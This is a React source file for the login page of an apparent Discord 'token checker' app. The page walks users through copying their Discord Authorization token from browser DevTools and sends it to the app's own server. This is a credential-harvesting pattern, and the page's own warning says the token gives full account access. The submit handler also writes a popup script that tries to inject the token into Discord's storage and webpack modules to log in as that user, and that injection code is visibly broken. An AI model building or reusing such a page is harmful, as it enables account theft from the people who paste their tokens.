import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { useMutation } from "@tanstack/react-query";
import { apiRequest } from "@/lib/queryClient";
import { TokenResult } from "@shared/schema";
import { useToast } from "@/hooks/use-toast";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from "@/components/ui/card";
import { Form, FormControl, FormDescription, FormField, FormItem, FormLabel, FormMessage } from "@/components/ui/form";
import { zodResolver } from "@hookform/resolvers/zod";
import { useForm } from "react-hook-form";
import { z } from "zod";
import { motion } from "framer-motion";
import { fadeIn, slideInUp } from "@/lib/animation";
import { Lock, LogIn, Copy, ExternalLink } from "lucide-react";
import { validateTokenFormat } from "@/lib/utils";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { 
  Dialog,
  DialogContent,
  DialogDescription,
  DialogFooter,
  DialogHeader,
  DialogTitle,
  DialogTrigger,
} from "@/components/ui/dialog";
import { Separator } from "@/components/ui/separator";

// Schema for login form
const loginSchema = z.object({
  token: z
    .string()
    .min(50, { message: "Token must be at least 50 characters." })
    .refine((val) => validateTokenFormat(val), {
      message: "Invalid token format. Token must contain a period (.)",
    }),
});

type LoginFormValues = z.infer<typeof loginSchema>;

export default function LoginPage() {
  const [, navigate] = useLocation();
  const [retrievedToken, setRetrievedToken] = useState<string>("");
  const [dialogOpen, setDialogOpen] = useState(false);
  const { toast } = useToast();
  
  // Form definition
  const form = useForm<LoginFormValues>({
    resolver: zodResolver(loginSchema),
    defaultValues: {
      token: "",
    },
  });

  // Update form when token is retrieved
  useEffect(() => {
    if (retrievedToken) {
      form.setValue("token", retrievedToken);
    }
  }, [retrievedToken, form]);
  
  // Login mutation
  const loginMutation = useMutation({
    mutationFn: async (token: string) => {
      const response = await apiRequest("POST", "/api/login", { token });
      return response.json() as Promise<{ message: string; user: TokenResult["user"] }>;
    },
    onSuccess: (data) => {
      toast({
        title: "Login Successful",
        description: `Welcome, ${data.user?.username}!`,
        variant: "default",
      });
      
      // Redirect to token checker page after successful login
      navigate("/token-checker");
    },
    onError: (error: Error) => {
      toast({
        title: "Login Failed",
        description: error.message || "Failed to login with Discord token. Please try again.",
        variant: "destructive",
      });
    },
  });
  
  // Form submission handler
  const onSubmit = (values: LoginFormValues) => {
    // Get the token from the form
    const token = values.token;
    
    // Open a new window with a script that will log into Discord using the token
    const discordWindow = window.open("about:blank", "_blank");
    
    if (discordWindow) {
      discordWindow.document.write(`
        <html>
          <head>
            <title>Logging into Discord...</title>
            <style>
              body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #36393f; color: white; }
              .container { text-align: center; padding: 20px; }
              .spinner { border: 4px solid rgba(255, 255, 255, 0.3); border-radius: 50%; border-top: 4px solid white; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
              @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
            </style>
          </head>
          <body>
            <div class="container">
              <h2>Logging into Discord...</h2>
              <div class="spinner"></div>
              <p>Please wait while we log you into Discord with the provided token...</p>
            </div>
            <script>
              // Function to log in to Discord with token
              function loginWithToken() {
                try {
                  // Navigate to Discord login page
                  location.href = 'https://discord.com/login';
                  
                  // Wait for page to load, then inject the token login script
                  setTimeout(() => {
                    // The token
                    const token = "${token}";
                    
                    // This code will be executed on the Discord login page
                    function setToken() {
                      try {
                        // Save the token to localStorage - different formats to ensure it works
                        localStorage.setItem('token', '"' + token + '"');
                        localStorage.setItem('discord_token', '"' + token + '"');
                        
                        // Also set token in the way Discord expects it
                        const userTokenKey = Object.keys(localStorage).find(key => key.includes('token'));
                        if (userTokenKey) {
                          localStorage.setItem(userTokenKey, '"' + token + '"');
                        }
                        
                        // Set cookie as backup method
                        document.cookie = "discord_token=" + token + "; path=/; domain=discord.com";
                        
                        // Create a script element to inject into Discord's page
                        const script = document.createElement('script');
                        script.textContent = \`
                          // Extend window interface for Discord properties
                          interface DiscordWindow extends Window {
                            webpackChunkdiscord_app?: any[];
                            _discordToken?: string;
                          }
                          
                          // Try to apply token directly to Discord's authentication system
                          try {
                            const discordWindow = window as DiscordWindow;
                            if (discordWindow.webpackChunkdiscord_app) {
                              discordWindow._discordToken = "\${token}";
                              
                              // Trigger login if possible using Discord's own code
                              discordWindow.webpackChunkdiscord_app.push([[Math.random()], {}, (req: any) => {
                                for (const m of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) {
                                  if (m.default && m.default.setToken !== undefined) {
                                    m.default.setToken("\${token}");
                                    return;
                                  }
                                }
                              }]);
                            }
                          } catch (e) {
                            console.error('Error setting token:', e);
                          }
                        \`;
                        document.head.appendChild(script);
                        
                        // Reload the page to apply the token authentication
                        setTimeout(() => {
                          window.location.href = 'https://discord.com/channels/@me';
                        }, 1500);
                      } catch (e) {
                        console.error('Error in token setup:', e);
                      }
                    }
                    
                    // Execute the token setter
                    setToken();
                    
                    // Let the user know it worked
                    document.body.innerHTML = '<div style="padding: 20px; text-align: center; font-family: Arial;">Successfully logged in with token! Redirecting to Discord...</div>';
                  }, 2000);
                } catch (error) {
                  document.body.innerHTML = '<div style="padding: 20px; text-align: center; font-family: Arial; color: red;">Error logging in with token. Please try again.</div>';
                }
              }
              
              // Start the login process
              loginWithToken();
            </script>
          </body>
        </html>
      `);
    }
    
    // Also authenticate with our app
    loginMutation.mutate(values.token);
  };

  // Token retrieval instructions
  const openDiscordAuth = () => {
    // Use our endpoint which will redirect to Discord with OAuth flow
    window.open("/api/discord-login", "_blank");
    
    // Show instructions dialog after opening Discord
    setTimeout(() => {
      setDialogOpen(true);
    }, 500);
  };

  // Copy token to clipboard
  const copyToken = () => {
    if (!retrievedToken) return;
    
    navigator.clipboard.writeText(retrievedToken).then(() => {
      toast({
        title: "Token Copied",
        description: "The token has been copied to your clipboard.",
        variant: "default",
      });
    }).catch(() => {
      toast({
        title: "Copy Failed",
        description: "Failed to copy token. Please try again.",
        variant: "destructive",
      });
    });
  };
  
  return (
    <div className="flex items-center justify-center py-8">
      <motion.div
        initial="hidden"
        animate="visible"
        variants={fadeIn}
        className="w-full max-w-md"
      >
        <Card className="border border-neutral-200 dark:border-neutral-700 shadow-lg">
          <CardHeader className="space-y-1">
            <CardTitle className="text-2xl font-bold text-center flex items-center justify-center">
              <Lock className="h-5 w-5 mr-2 text-primary" />
              Discord Authentication
            </CardTitle>
            <CardDescription className="text-center">
              Login with your Discord token or get a new one
            </CardDescription>
          </CardHeader>
          
          <CardContent>
            <Tabs defaultValue="manual" className="w-full">
              <TabsList className="grid w-full grid-cols-2 mb-4">
                <TabsTrigger value="manual">Manual Token</TabsTrigger>
                <TabsTrigger value="retrieve">Get Discord Token</TabsTrigger>
              </TabsList>
              
              <TabsContent value="manual" className="space-y-4">
                <Form {...form}>
                  <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
                    <FormField
                      control={form.control}
                      name="token"
                      render={({ field }) => (
                        <FormItem>
                          <FormLabel>Discord Token</FormLabel>
                          <FormControl>
                            <Input 
                              type="password"
                              placeholder="Enter your Discord token" 
                              {...field}
                              className="font-mono"
                            />
                          </FormControl>
                          <FormDescription>
                            Your token will be securely processed.
                          </FormDescription>
                          <FormMessage />
                        </FormItem>
                      )}
                    />
                    
                    <Button 
                      type="submit" 
                      className="w-full bg-[#5865F2] hover:bg-[#4752C4]"
                      disabled={loginMutation.isPending}
                    >
                      {loginMutation.isPending ? (
                        <span className="flex items-center justify-center">
                          <svg className="animate-spin -ml-1 mr-2 h-4 w-4 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                            <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                            <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                          </svg>
                          Logging in...
                        </span>
                      ) : (
                        <span className="flex items-center justify-center">
                          <LogIn className="h-4 w-4 mr-2" />
                          Login with Token
                        </span>
                      )}
                    </Button>
                  </form>
                </Form>
              </TabsContent>
              
              <TabsContent value="retrieve" className="space-y-4">
                <div className="space-y-4">
                  <div className="rounded-md bg-blue-50 dark:bg-blue-900/20 p-4">
                    <div className="flex">
                      <div className="flex-shrink-0">
                        <svg className="h-5 w-5 text-blue-500" viewBox="0 0 20 20" fill="currentColor">
                          <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clipRule="evenodd" />
                        </svg>
                      </div>
                      <div className="ml-3 flex-1 md:flex md:justify-between">
                        <p className="text-sm text-blue-700 dark:text-blue-200">
                          We'll help you get your Discord token automatically from the Discord website.
                        </p>
                      </div>
                    </div>
                  </div>
                  
                  <div className="space-y-4">
                    <h3 className="text-base font-medium">Get your Discord token in a few steps:</h3>
                    <ol className="list-decimal pl-5 space-y-2 text-sm">
                      <li>Click the button below to open Discord in a new tab</li>
                      <li>Log in to your Discord account if not already logged in</li>
                      <li>Follow the instructions in the popup to retrieve your token</li>
                    </ol>
                  </div>
                  
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-2">
                    <Button 
                      className="w-full bg-[#5865F2] hover:bg-[#4752C4]" 
                      onClick={openDiscordAuth}
                    >
                      <ExternalLink className="h-4 w-4 mr-2" />
                      Discord Login
                    </Button>
                    
                    <Button 
                      className="w-full"
                      variant="outline"
                      onClick={() => window.open("https://discord.com/app", "_blank")}
                    >
                      <ExternalLink className="h-4 w-4 mr-2" />
                      Open Discord Web
                    </Button>
                  </div>
                  
                  {retrievedToken && (
                    <div className="mt-4 space-y-2">
                      <div className="flex flex-col space-y-2">
                        <FormLabel>Your Discord Token</FormLabel>
                        <div className="relative">
                          <Input 
                            value={retrievedToken} 
                            readOnly 
                            type="password"
                            className="pr-10 font-mono text-xs"
                          />
                          <Button 
                            size="sm" 
                            variant="ghost" 
                            className="absolute right-0 top-0 h-full px-3" 
                            onClick={copyToken}
                          >
                            <Copy className="h-4 w-4" />
                          </Button>
                        </div>
                      </div>
                      
                      <Button 
                        onClick={() => form.handleSubmit(onSubmit)()}
                        className="w-full bg-[#5865F2] hover:bg-[#4752C4]"
                        disabled={!retrievedToken}
                      >
                        <LogIn className="h-4 w-4 mr-2" />
                        Use Token & Login
                      </Button>
                    </div>
                  )}
                </div>
              </TabsContent>
            </Tabs>
          </CardContent>
        </Card>
      </motion.div>
      
      {/* Dialog with token retrieval instructions */}
      <Dialog open={dialogOpen} onOpenChange={setDialogOpen}>
        <DialogContent className="sm:max-w-md">
          <DialogHeader>
            <DialogTitle>How to Get Your Discord Token</DialogTitle>
            <DialogDescription>
              Follow these steps to retrieve your Discord token:
            </DialogDescription>
          </DialogHeader>
          
          <div className="space-y-4 py-2">
            <ol className="list-decimal pl-5 space-y-3 text-sm">
              <li>After logging into Discord in the new tab, press <kbd className="px-2 py-1 bg-gray-100 dark:bg-gray-800 rounded">F12</kbd> or <kbd className="px-2 py-1 bg-gray-100 dark:bg-gray-800 rounded">Ctrl+Shift+I</kbd> to open Developer Tools</li>
              <li>Go to the <strong>Network</strong> tab in Developer Tools</li>
              <li>Filter requests by typing <kbd className="px-2 py-1 bg-gray-100 dark:bg-gray-800 rounded">api</kbd> in the filter box</li>
              <li>Click on any request going to <code>discord.com/api</code></li>
              <li>In the request details, look for <strong>Request Headers</strong> section</li>
              <li>Find the <strong>Authorization</strong> header - the value is your token</li>
              <li>Copy the token and paste it back in this app</li>
            </ol>
            
            <Separator />
            
            <div className="rounded-md bg-amber-50 dark:bg-amber-900/20 p-3">
              <div className="flex">
                <div className="flex-shrink-0">
                  <svg className="h-5 w-5 text-amber-400" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
                    <path fillRule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clipRule="evenodd" />
                  </svg>
                </div>
                <div className="ml-3">
                  <p className="text-sm text-amber-700 dark:text-amber-200">
                    Never share your token with anyone. It provides full access to your Discord account.
                  </p>
                </div>
              </div>
            </div>
          </div>
          
          <DialogFooter className="sm:justify-center">
            <Button
              type="button"
              variant="outline"
              onClick={() => {
                setDialogOpen(false);
              }}
            >
              Close Instructions
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>
    </div>
  );
}